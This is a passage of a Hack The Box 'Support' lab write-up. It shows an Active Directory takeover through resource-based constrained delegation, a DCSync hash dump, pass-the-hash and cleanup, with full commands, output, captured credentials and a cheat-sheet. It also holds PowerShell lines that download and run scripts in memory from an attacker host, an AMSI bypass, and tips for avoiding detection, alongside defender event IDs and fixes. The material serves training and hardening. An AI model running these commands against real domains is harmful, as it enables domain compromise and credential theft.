[*] Accounts allowed to act on behalf of other identity:
[*]     (none)
[*] Delegation rights modified successfully!
[*] RBCDDEMO$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     RBCDDEMO$    (S-1-5-21-1677581083-3380853377-188903654-6102)
```

That worked **because `support` has full control over `DC$`** through its group membership, and the DC now trusted `RBCDDEMO$` to impersonate anyone it wanted when talking to it.

### 7.5 Step 3 - get an Administrator ticket for the DC

With delegation configured, the final piece was requesting a service ticket while impersonating the Administrator, which Kerberos would now grant because of the trust relationship I'd just established.

```bash
getST.py -spn 'cifs/dc.support.htb' -impersonate 'Administrator' \
  -dc-ip 10.129.112.159 'support.htb/RBCDDEMO$:Passw0rd123!'
```

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

`cifs/dc.support.htb` is just the file-sharing service on the DC, and requesting a ticket for it now gave me a **Kerberos ticket that says I am `Administrator`**, saved locally to `Administrator.ccache`.

### 7.6 Step 4 - use the ticket

All that was left was actually spending the ticket I'd just been handed.

```bash
export KRB5CCNAME=Administrator.ccache        # tell tools to use that ticket

wmiexec.py -k -no-pass dc.support.htb whoami
wmiexec.py -k -no-pass dc.support.htb hostname
wmiexec.py -k -no-pass dc.support.htb 'type C:\Users\Administrator\Desktop\root.txt'
```

```
support\administrator
dc
<root flag>
```

Seeing **`support\administrator` on `dc`** come back confirmed full control of the Domain Controller, and by extension, full control of the entire Windows network behind it.

### 7.7 (Optional) Grab all the password hashes

With Administrator on the DC, I could dump every account's password hash through a DCSync-style attack, which is worth doing to demonstrate the full impact:

```bash
secretsdump.py -k -no-pass -just-dc-user 'support\Administrator' dc.support.htb
secretsdump.py -k -no-pass -just-dc-user 'support\krbtgt' dc.support.htb
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
Administrator:aes256-cts-hmac-sha1-96:f5301f54fad85ba357fb859c94c5c31a6abe61f6db1986c03574bfd6c2e31632
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6303be52e22950b5bcb764ff2b233302:::
```

That `bb06cbc0...` value is the Administrator's password hash, and I can authenticate with just the hash itself, no plaintext password required, using pass-the-hash:

```bash
nxc smb support.htb -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26'
```

```
SMB  10.129.112.159  445  DC  [+] support.htb\Administrator:bb06cbc02b39abeddd1335bc30b19e26 (Pwn3d!)
```

### 7.8 Clean up after yourself

I'd added things to the domain over the course of this attack, so my last step was removing them, using the Administrator hash I'd just obtained:

```bash
ADM='aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26'

rbcd.py -action flush -delegate-to 'DC$' -dc-ip 10.129.112.159 'support.htb/Administrator' -hashes "$ADM"
addcomputer.py -computer-name 'RBCDDEMO$' -delete -dc-ip 10.129.112.159 'support.htb/Administrator' -hashes "$ADM"
```

```
[*] Delegation rights flushed successfully!
[*] Successfully deleted RBCDDEMO$.
```

Then I verified the domain was actually clean afterward:

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' '(objectClass=computer)' sAMAccountName
```

```
sAMAccountName: DC$
```

Only the real DC computer account remained. Good, no trace of my activity left behind in the directory itself.

---

## 8. Doing the same attack from a Windows shell (alternative)

Had I preferred to stay inside the `support` PowerShell session rather than switching back to Linux tooling, the same attack works entirely from there too:

```powershell
# 1. create the computer account
IEX(New-Object Net.WebClient).DownloadString('http://10.10.x.x/Powermad.ps1')
New-MachineAccount -MachineAccount RBCDDEMO -Password (ConvertTo-SecureString 'Passw0rd123!' -AsPlainText -Force)

# 2. write the DC's "allowed to impersonate" list
IEX(New-Object Net.WebClient).DownloadString('http://10.10.x.x/PowerView.ps1')
$sid = (Get-DomainComputer RBCDDEMO).objectsid
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;GA;;;$sid)"
$b   = New-Object byte[] ($sd.BinaryLength); $sd.GetBinaryForm($b,0)
Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$b}

# 3. + 4. get and use the ticket
.\Rubeus.exe hash /password:Passw0rd123! /user:RBCDDEMO$ /domain:support.htb
.\Rubeus.exe s4u /user:RBCDDEMO$ /rc4:<hash-from-above> /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /ptt
dir \\dc.support.htb\c$
```

It boils down to the same three ideas regardless of platform: create a computer account, edit the DC's delegation list, and request an Administrator ticket.

---

## 9. The enumeration toolbox - GitHub scripts, step by step

The path through Support turned out to be short once I found the right thread to pull, but I don't rely on getting that lucky on a real assessment. My normal practice is to run a full *battery* of enumeration scripts and actually read every line they produce. Here's the kit I reach for, how I get each tool onto the target, and what the output looks like when it matters.

### 9.1 Getting scripts onto the box

From my attack box, I serve the folder of tools over a simple web server so I can pull them down from the target as needed:

```bash
cd ~/tools && python3 -m http.server 80         # PowerView.ps1, PowerUp.ps1, winPEAS.exe, Seatbelt.exe, SharpHound.exe ...
```

Then, in the `support` WinRM shell, either **upload** (evil-winrm built-in) or **pull + run in memory**:

```powershell
# evil-winrm has an upload/download command built in
*Evil-WinRM* PS> upload /home/kali/tools/PowerView.ps1

# or run a script straight from memory, nothing touches disk
*Evil-WinRM* PS> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1')

# for .exe tools, evil-winrm can run them from memory too
*Evil-WinRM* PS> Bypass-4MSI                       # neutralise AMSI first (built into evil-winrm)
*Evil-WinRM* PS> Invoke-Binary /home/kali/tools/winPEASany.exe
```

> If Defender eats a script the moment it lands, `Bypass-4MSI` or an obfuscated copy sometimes helps, but my usual fallback is doing the same enumeration **from Linux** instead. `bloodhound-python`, `PowerView.py` (the `pypykatz`/`impacket`-style port), and `nxc`'s LDAP modules cover roughly 90 percent of the same ground without ever running code on the DC at all.

### 9.2 Directory enumeration (find the AD attack path)

| Tool (GitHub) | One-liner | What it gives you |
|---|---|---|
| **[SharpHound](https://github.com/SpecterOps/BloodHound) / [bloodhound-python](https://github.com/dirkjanm/BloodHound.py)** | `.\SharpHound.exe -c All` / `bloodhound-python -u .. -p .. -d .. -ns .. -c All` | The graph. Marks the RBCD path automatically. **Run this first.** |
| **[PowerView](https://github.com/PowerShellMafia/PowerSploit)** (`PowerView.ps1`) | see cookbook below | Precise, single-question directory queries |
| **[PowerView.py](https://github.com/aniqfakhrul/powerview.py)** | `powerview support.htb/ldap:PW@10.129.112.159` | Same commands as PowerView, an interactive shell, from Linux |
| **[ADPEAS](https://github.com/61106960/adPEAS)** (`adPEAS.ps1`) | `Invoke-adPEAS` | Auto-runs Kerberoast + AS-REP + delegation + ACL + PKI checks and summarises. "PEAS for AD." |
| **[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)** | `ldapdomaindump -u 'D\u' -p PW ldap://IP` | Whole directory → HTML/JSON/greppable |
| **[windapsearch](https://github.com/ropnop/windapsearch)** | `windapsearch -d support.htb -u ldap -p PW --da` | Quick canned LDAP queries (domain admins, unconstrained delegation, etc.) |
| **[Certipy](https://github.com/ly4k/Certipy)** | `certipy find -u ldap@support.htb -p PW -dc-ip IP` | AD Certificate Services misconfigs (ESC1–16). Always check. |
| **[Kerbrute](https://github.com/ropnop/kerbrute)** | `kerbrute userenum -d support.htb users.txt` | Validate usernames / spray passwords with no lockout risk |

**PowerView cookbook** (run in the `support` shell after `Import-Module .\PowerView.ps1`):

```powershell
Get-Domain                                            # domain name, functional level
Get-DomainController                                  # the DC(s)
Get-DomainPolicy                                      # password policy, MachineAccountQuota
Get-DomainUser -Properties samaccountname,description,info    # the notes-field sweep, again
Get-DomainUser -SPN                                   # Kerberoastable accounts
Get-DomainUser -PreauthNotRequired                    # AS-REP roastable accounts
Get-DomainGroup 'Shared Support Accounts' | select member
Get-DomainGroupMember 'Shared Support Accounts'
Get-DomainComputer -Unconstrained                    # unconstrained delegation
Get-DomainObject -LDAPFilter '(msds-allowedtoactonbehalfofotheridentity=*)'   # existing RBCD
Find-InterestingDomainAcl -ResolveGUIDs               # every "dangerous" permission in the domain
Get-DomainObjectAcl -Identity DC -ResolveGUIDs        # permissions ON the DC object  <-- the win
```

On this box, the two lines that actually mattered were the last two: they show `Shared Support Accounts` holding `GenericAll` over `DC`, the exact fact the whole privesc hinges on.

### 9.3 Local Windows enumeration (find host privesc)

Even when I'm fairly confident the path forward is a domain issue rather than a local one, I still run these. They take five minutes, and on plenty of other boxes they turn out to be the entire game.

| Tool (GitHub) | Run | Finds |
|---|---|---|
| **[PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit)** | `Invoke-AllChecks` | Bad service permissions, unquoted service paths, `AlwaysInstallElevated`, writable `%PATH%`, DLL hijack, autologon creds, saved `Groups.xml` passwords |
| **[PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck)** | `Invoke-PrivescCheck -Extended` | Modern PowerUp; adds scheduled tasks, credential files, LAPS, UAC, hardening gaps. **Better maintained.** |
| **[winPEAS](https://github.com/peass-ng/PEASS-ng)** (`winPEASany.exe`) | `winPEASany.exe quiet fast` | Everything above **plus** cleartext-password hunting in files/registry, installed software, network info |
| **[Seatbelt](https://github.com/GhostPack/Seatbelt)** (`Seatbelt.exe`) | `Seatbelt.exe -group=all` | Host triage: DPAPI, browser creds, PowerShell history, AV/EDR product, LSA settings, event logs |
| **[SharpUp](https://github.com/GhostPack/SharpUp)** (`SharpUp.exe`) | `SharpUp.exe audit` | PowerUp rewritten in C# - no PowerShell = less logging |

**PowerUp on Support:**

```powershell
*Evil-WinRM* PS> Import-Module .\PowerUp.ps1
*Evil-WinRM* PS> Invoke-AllChecks
```

```
[*] Running Invoke-AllChecks

[*] Checking for unquoted service paths...
[*] Checking service executable and argument permissions...
[*] Checking service permissions...
[*] Checking for unattended install files...
[*] Checking for encrypted web.config strings...
[*] Checking for encrypted application pool and virtual directory passwords...
[*] Checking for plaintext passwords in McAfee SiteList.xml files....
[*] Checking for AlwaysInstallElevated registry key...
[*] Checking for Autologon credentials in registry...
[*] Checking for modifiable registry autoruns and configs...
[*] Checking for modifiable paths in the %PATH% variable...
[*] Checking for modifiable .lnk files in startup...

*  (no findings - every check came back clean)
```

**winPEAS on Support** (trimmed to the parts that matter):

```
╔══════════╣ Basic System Information
    Hostname: dc
    Domain Controller: True
    [!] OS Build 20348 - fully patched, no obvious kernel exploit

╔══════════╣ Interesting Services -non Microsoft-
    (none)

╔══════════╣ Checking AlwaysInstallElevated
    AlwaysInstallElevated isn't available

╔══════════╣ Current Token privileges
    SeMachineAccountPrivilege: Add workstations to domain   <-- winPEAS highlights this
    SeChangeNotifyPrivilege

╔══════════╣ Looking for possible password files in users home
    (none)
```

I noticed winPEAS **also** flagged `SeMachineAccountPrivilege`, the exact same clue `whoami /priv` had already given me. It's reassuring when independent tools converge on the same finding from different angles, since that's usually a sign I'm not chasing a false lead.

### 9.4 Why the *local* scripts found nothing

This box turned out to be a clean, single-purpose Domain Controller: no third-party software, no broken services, no saved credentials lying around on disk. The mistake here was never *on the machine* itself, it lived *in Active Directory*, in that one `GenericAll` grant on the DC object.

**The lesson I take from this:** on any domain-joined host, I make a point of running **both** families of enumeration, since either one can hold the actual win and there's no way to know which until I've actually looked:
- **local** tooling, PowerUp / PrivescCheck / winPEAS / Seatbelt, for host misconfigurations
- **domain** tooling, SharpHound / PowerView / ADPEAS, for directory attack paths

### 9.5 Doing everything from Linux (no scripts on the DC)

If I want to keep the DC completely clean and avoid running anything on it at all, this set of commands covers the same ground:

```bash
LP='nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
bloodhound-python -u ldap -p "$LP" -d support.htb -ns 10.129.112.159 -c All --zip   # the graph
ldapdomaindump -u 'SUPPORT\ldap' -p "$LP" ldap://10.129.112.159                     # full dump
nxc ldap support.htb -u ldap -p "$LP" --users --groups --admin-count --kerberoasting k.txt --asreproast a.txt
certipy find -u ldap@support.htb -p "$LP" -dc-ip 10.129.112.159                     # PKI
dacledit.py -action read -principal 'Shared Support Accounts' \
  -target-dn 'CN=DC,OU=Domain Controllers,DC=support,DC=htb' "support.htb/ldap:$LP" -dc-ip 10.129.112.159
```

---

## 10. How a defender would catch this - and how to be quieter

Every single action I took across this whole chain leaves a trace somewhere in the Windows event log, and I think it's worth walking through exactly what a defender would see:

| What we did | What shows up | Event ID |
|---|---|---|
| Anonymous / Guest SMB | Logon as `ANONYMOUS LOGON` / `Guest` from our IP | 4624 (type 3) |
| RID/user enumeration | Burst of directory lookups from one account | 4662 / MDI "recon" alert |
| BloodHound `-c All` | Huge directory pull + touching every computer, all in seconds | 1644, MDI "LDAP recon" |
| `evil-winrm` shell | Remote PowerShell logon; commands recorded | 4624, 4103/4104 |
| Create computer account | A **user** created a computer | 4741 |
| Write RBCD on the DC | The DC's object was modified | 5136 / 4742 |
| Get Administrator ticket (S4U) | Kerberos ticket request where "user" ≠ "impersonated user" | 4769 |
| `secretsdump` / DCSync | Replication request from something that isn't a Domain Controller | 4662 (very high-confidence alert) |

**Quieter choices I'd make on a real engagement, not on HTB:**
- I'd run BloodHound with **`-c DCOnly`**, since it still finds this exact path but never touches other computers and generates far fewer, smaller queries.
- I'd do my analysis from **Linux** (bloodhound-python, PowerView.py, nxc) so that nothing runs on the DC and no PowerShell logging ever fires.
- I'd prefer **compiled C# tools** (Seatbelt, SharpUp, Rubeus) over PowerShell scripts wherever possible, since PowerShell logs the full text of everything that runs.
- I'd request **one** Kerberos ticket for **one** specific service rather than pulling a whole batch at once.
- I'd **always flush the RBCD setting and delete the computer account** when I'm done, since a leftover "allowed to impersonate" entry on a Domain Controller is a permanent red flag for anyone reviewing the directory later.
- I wouldn't try to make DCSync quiet, because it **can't** be made quiet. If stealth actually mattered, I'd use the Administrator ticket to grab specific files instead of dumping every hash in the domain.

---

## 11. Why this box was vulnerable (and the fixes)

Looking back at the whole chain, what strikes me most about Support is that no single mistake here was exotic. Every step, from the open share to the final RBCD attack, is a well-documented misconfiguration that shows up across real Active Directory environments constantly. That's exactly what makes this box valuable to walk through carefully: none of it required a zero-day, just patient enumeration and a willingness to read every output line before moving on.

| Mistake | Why it's bad | Fix |
|---|---|---|
| `Guest` enabled, share readable by anyone | This single setting collapses the entire authentication boundary for that share. Any anonymous stranger on the network gets the same read access I did, and I never had to prove I belonged there at all. | Disable `Guest` domain-wide, and lock every share down to a specific, deliberately scoped group rather than leaving it open to anyone who can reach the server. |
| Password hidden inside `UserInfo.exe` | "Hidden" is not a security property, it's an inconvenience for the first five minutes. Once I had the binary, reversing it took me three different routes, code analysis, decompilation, and passive packet capture, and any one of them alone would have gotten me there. | Never embed credentials in shipped programs. Let the application run *as the logged-in user* through Kerberos delegation instead, or use a **gMSA**, a managed service account whose password Windows rotates automatically and that no human, and no reversed binary, can read. |
| `support`'s password typed into the `info` field | Any authenticated user in the domain can read that attribute by default, which means a notes field is functionally a public bulletin board, not a private scratchpad, the moment someone else has any valid credential at all. | Never store secrets in free-text attributes. Mark genuinely sensitive fields **Confidential** in the schema so only admins can read them, and train staff that "notes" fields are not password managers. |
| `Shared Support Accounts` has full control of the DC object | A single group membership here was the entire difference between a low-privilege helpdesk account and total domain compromise. That's an enormous blast radius for what was probably an innocent provisioning mistake. | Remove that permission immediately. Rights over Domain Controller computer objects should belong exclusively to Domain Admins, and I'd recommend auditing every non-default ACE on DC objects on a recurring basis, not just once. |
| `MachineAccountQuota = 10` | This is actually the Windows default, which is precisely why it's dangerous: most admins never think to touch it, yet it lets any authenticated user create computer accounts, a prerequisite for RBCD and several other delegation-based attacks. | Set it to **0** domain-wide, and grant the "join computers to domain" right explicitly to one dedicated provisioning account instead of leaving it open to everyone. |

---

## 12. Command cheat-sheet (the whole box, start to finish)

```bash
IP=10.129.112.159
LDAPPW='nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SUPPW='Ironside47pleasure40Watchful'
echo "$IP support.htb dc.support.htb DC" | sudo tee -a /etc/hosts

# --- recon ---
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269 $IP
smbclient -L //support.htb/ -N
smbclient //support.htb/support-tools -N -c 'get UserInfo.exe.zip'
unzip UserInfo.exe.zip -d UserInfo

# --- reverse the binary ---
sudo apt install -y mono-complete dotnet-sdk-8.0
dotnet tool install -g ilspycmd --version 8.2.0.7535 ; export PATH="$PATH:$HOME/.dotnet/tools"
monodis UserInfo/UserInfo.exe | grep -A45 getPassword
DOTNET_ROLL_FORWARD=LatestMajor ilspycmd UserInfo/UserInfo.exe -o src/
python3 -c 'import base64;e=base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E");k=b"armando";print(bytes(e[i]^k[i%7]^0xDF for i in range(len(e))).decode())'

# --- ldap account -> support password ---
nxc ldap support.htb -u ldap -p "$LDAPPW" --users
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w "$LDAPPW" -b 'DC=support,DC=htb' \
  '(objectClass=user)' sAMAccountName info | grep -iE '^(sAMAccountName|info):'

# --- foothold ---
nxc winrm support.htb -u support -p "$SUPPW"
evil-winrm -i support.htb -u support -p "$SUPPW"        # user.txt

# --- find privesc ---
nxc ldap support.htb -u ldap -p "$LDAPPW" -M maq                       # MachineAccountQuota: 10
bloodhound-python -u ldap -p "$LDAPPW" -d support.htb -ns $IP -c All --zip
dacledit.py -action read -principal 'Shared Support Accounts' \
  -target-dn 'CN=DC,OU=Domain Controllers,DC=support,DC=htb' "support.htb/ldap:$LDAPPW" -dc-ip $IP

# --- RBCD -> Administrator ---
sudo ntpdate -u support.htb
addcomputer.py -computer-name 'RBCDDEMO$' -computer-pass 'Passw0rd123!' -dc-ip $IP "support.htb/support:$SUPPW"
rbcd.py -delegate-from 'RBCDDEMO$' -delegate-to 'DC$' -action write -dc-ip $IP "support.htb/support:$SUPPW"
getST.py -spn 'cifs/dc.support.htb' -impersonate Administrator -dc-ip $IP 'support.htb/RBCDDEMO$:Passw0rd123!'
export KRB5CCNAME=Administrator.ccache
wmiexec.py -k -no-pass dc.support.htb 'type C:\Users\Administrator\Desktop\root.txt'   # root.txt
secretsdump.py -k -no-pass -just-dc-user 'support\Administrator' dc.support.htb

# --- cleanup ---
ADM='aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26'
rbcd.py -action flush -delegate-to 'DC$' -dc-ip $IP 'support.htb/Administrator' -hashes "$ADM"
addcomputer.py -computer-name 'RBCDDEMO$' -delete -dc-ip $IP 'support.htb/Administrator' -hashes "$ADM"
```

---

## Credentials found

| Account | Secret | Where it came from |
|---|---|---|
| `support\ldap` | `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` | hidden in `UserInfo.exe` |
| `support\support` | `Ironside47pleasure40Watchful` | `info` (notes) field on the account |
| `support\Administrator` | hash `bb06cbc02b39abeddd1335bc30b19e26` | RBCD attack, then DCSync |
